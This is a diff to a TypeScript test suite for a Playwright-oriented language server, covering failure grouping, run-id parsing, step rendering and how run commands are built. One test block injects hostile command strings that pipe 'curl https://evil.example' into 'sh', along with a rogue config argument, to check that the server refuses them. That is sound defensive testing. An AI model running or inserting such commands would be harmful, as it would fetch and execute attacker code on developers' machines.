@@ -145,6 +145,10 @@ let laidOver: unknown = null;
 /** The fixture repository's one commit, which run #41 ran at: the files the failures are followed from. */
 let fixtureCommit = '';
 
+/** What the instance answers for a run's arguments and the smoke selection's command, once a test sets them. */
+let hostileMaterialization: unknown = null;
+let hostileSelectionCommand: string | null = null;
+
 /**
  * The API key of the service the tests of runs as they happen start: the stub streams the instance's events to that
  * key only, and is an instance without the route for every other.
@@ -494,7 +498,10 @@ beforeAll(async () => {
         {
           key: 'smoke',
           name: 'Smoke',
-          resolved: { testCaseIds: [1], command: 'npx playwright test tests/checkout.spec.ts:3' },
+          resolved: {
+            testCaseIds: [1],
+            command: hostileSelectionCommand ?? 'npx playwright test tests/checkout.spec.ts:3',
+          },
         },
         { key: 'failed', name: null, resolved: { testCaseIds: [3], command: 'npx playwright test --grep x' } },
       ];
@@ -601,7 +608,7 @@ beforeAll(async () => {
     if (u === '/api/projects/7/selections/preview') {
       return res.end(
         JSON.stringify({
-          materialization: {
+          materialization: hostileMaterialization ?? {
             args: ['tests/checkout.spec.ts:3'],
             command: 'npx playwright test tests/checkout.spec.ts:3',
           },
@@ -657,15 +664,17 @@ beforeAll(async () => {
   });
   expect(init).toMatchObject({ capabilities: { hoverProvider: true } });
   await client.sendNotification('initialized', {});
-  // The indexes are fetched in the background: wait until the status says so.
-  await waitFor(() => (connected ? true : undefined));
+  // The indexes are fetched in the background, the code index after the latest run's failures: wait until the
+  // status shows both.
+  await waitFor(() => (ready ? true : undefined));
 });
 
-let connected = false;
+let ready = false;
 const pollStatus = setInterval(async () => {
-  if (!client || connected) return;
+  if (!client || ready) return;
   const status = (await client.sendRequest('piwi/status').catch(() => null)) as StatusResult | null;
-  connected = !!status?.contexts[0]?.connected;
+  const context = status?.contexts[0];
+  ready = !!context?.connected && context.reachedFiles > 0;
 }, 30);
 
 afterAll(async () => {
@@ -940,7 +949,35 @@ describe('the Piwi language server', () => {
       overlays: [],
       baseline: { choice: { kind: 'ladder' }, label: 'run #41 on main' },
       updatedAt: expect.any(String),
+      grouping: 'file',
+      tree: [expect.objectContaining({ key: 'run', label: 'Run #41 · CI · main · 1 failing' })],
+      runLabel: 'Run #41 · CI · main · 1 failing',
+      failing: 1,
+      rerun: [{ uri: uri('tests/pages/checkout.page.ts'), root: dir, testIds: [3] }],
     });
+    expect(failures.tree[0]!.children.map((group) => [group.key, group.children.map((leaf) => leaf.key)])).toEqual([
+      ['group:file:tests/rows.spec.ts', ['failure:900']],
+    ]);
+  });
+
+  test('groups the failures as the client last asked, for the failures it pushes too', async () => {
+    const byCluster = (await client.sendRequest('piwi/failures', { grouping: 'cluster' })) as FailuresResult;
+    expect(byCluster.grouping).toBe('cluster');
+    expect(byCluster.tree[0]!.children.map((group) => [group.key, group.label])).toEqual([
+      ['group:cluster:77', 'Cluster #77'],
+    ]);
+    const kept = (await client.sendRequest('piwi/failures')) as FailuresResult;
+    expect(kept.grouping).toBe('cluster');
+    const back = (await client.sendRequest('piwi/failures', { grouping: 'file' })) as FailuresResult;
+    expect(back.grouping).toBe('file');
+    expect(((await client.sendRequest('piwi/failures', { grouping: 'folder' })) as FailuresResult).grouping).toBe(
+      'file',
+    );
+  });
+
+  test('reads a run id typed for A run by id…', async () => {
+    expect(await client.sendRequest('piwi/runId', { text: ' #118 ' })).toEqual({ runId: 118 });
+    expect(await client.sendRequest('piwi/runId', { text: '2147483648' })).toEqual({ runId: null });
   });
 
   test('gives a failure’s context for an agent', async () => {
@@ -1087,7 +1124,7 @@ describe('the Piwi language server', () => {
     expect(selection).toEqual({
       cwd: dir,
       command: 'npx playwright test tests/checkout.spec.ts:3',
-      args: [],
+      args: ['tests/checkout.spec.ts:3'],
       env: { PIWI_ORIGIN: 'editor', PIWI_ORIGIN_REF: selection.ref },
       ref: expect.stringMatching(/^ed-[0-9a-f]{8}$/),
     });
@@ -1352,6 +1389,35 @@ describe('breakpoints', () => {
         edit: null,
       });
     }
+  });
+});
+
+describe('the command line of a run', () => {
+  afterAll(async () => {
+    hostileMaterialization = null;
+    hostileSelectionCommand = null;
+    await client.sendRequest('piwi/refresh');
+  });
+
+  const runArgs = () => client.sendRequest('piwi/runArgs', { uri: uri('tests/checkout.spec.ts'), testIds: [1] });
+
+  test("is built from the instance's arguments, never its command text", async () => {
+    hostileMaterialization = {
+      args: ['tests/checkout.spec.ts:3'],
+      command: 'npx playwright test tests/checkout.spec.ts:3; curl https://evil.example | sh',
+    };
+    expect(((await runArgs()) as RunCommand).command).toBe('npx playwright test tests/checkout.spec.ts:3');
+
+    hostileMaterialization = { args: ['--config=evil.config.ts'], command: 'npx playwright test' };
+    expect(await runArgs()).toBeNull();
+  });
+
+  test('is refused for a selection whose command is anything but npx playwright test and its arguments', async () => {
+    hostileSelectionCommand = 'npx playwright test tests/checkout.spec.ts:3 && curl https://evil.example';
+    await client.sendRequest('piwi/refresh');
+    expect(
+      await client.sendRequest('piwi/runSelection', { uri: uri('tests/checkout.spec.ts'), key: 'smoke' }),
+    ).toBeNull();
   });
 });
 
@@ -3066,16 +3132,21 @@ describe('recording from the editor', () => {
       line: 2,
       character: 0,
     })) as RenderStepsResult;
-    expect(inPageObject.code).toContain("  await this.page.getByRole('button', { name: 'Pay now' }).click();");
-    expect(inPageObject.code).toContain("  await this.page.goto('/checkout');");
-    expect(inPageObject.imports).toBeUndefined();
+    // The first line goes at the caret, the next ones take its line's indentation.
+    expect(inPageObject.code).toBe(
+      "await this.page.goto('/checkout');\n  await this.page.getByRole('button', { name: 'Pay now' }).click();",
+    );
+    expect(inPageObject.importEdit).toBeUndefined();
 
     const separate = (await recorder.sendRequest('piwi/renderSteps', {
       uri: uri('tests/checkout.spec.ts'),
       steps,
       imports: 'separate',
     })) as RenderStepsResult;
-    expect(separate.imports).toEqual(["import { CheckoutPage } from 'tests/pages/checkout.page.ts';"]);
+    expect(separate.importEdit).toEqual({
+      range: { start: { line: 1, character: 0 }, end: { line: 1, character: 0 } },
+      newText: "import { CheckoutPage } from 'tests/pages/checkout.page.ts';\n",
+    });
     expect(separate.code).not.toContain('// Needs:');
     expect(separate.code).toContain("  await checkoutPage.pay('');");
 
@@ -3084,7 +3155,7 @@ describe('recording from the editor', () => {
       steps,
     })) as RenderStepsResult;
     expect(comments.code).toContain("  // Needs: import { CheckoutPage } from 'tests/pages/checkout.page.ts';");
-    expect(comments.imports).toBeUndefined();
+    expect(comments.importEdit).toBeUndefined();
   });
 
   test('renders steps without the imports the open file has, nor a page object the test declares already', async () => {
@@ -3106,9 +3177,8 @@ describe('recording from the editor', () => {
       character: 0,
       imports: 'separate',
     })) as RenderStepsResult;
-    expect(rendered.imports).toEqual([]);
-    expect(rendered.code).not.toContain('new CheckoutPage');
-    expect(rendered.code).toContain("  await checkoutPage.pay('');");
+    expect(rendered.importEdit).toBeNull();
+    expect(rendered.code).toBe("await page.goto('/checkout');\nawait checkoutPage.pay('');");
   });
 
   test('writes paths only when the flow was recorded on the baseURL’s origin', async () => {
